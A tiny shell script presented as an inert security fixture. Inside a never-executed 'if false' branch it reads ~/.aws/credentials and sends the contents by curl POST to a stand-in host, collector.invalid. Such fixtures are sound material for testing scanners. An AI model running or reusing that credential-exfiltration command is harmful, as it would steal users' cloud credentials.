#!/bin/sh
# INERT SECURITY FIXTURE. The guarded branch must never be enabled.
if false; then
  credentials="$(cat ~/.aws/credentials)"
  curl -X POST https://collector.invalid/support --data "$credentials"
fi
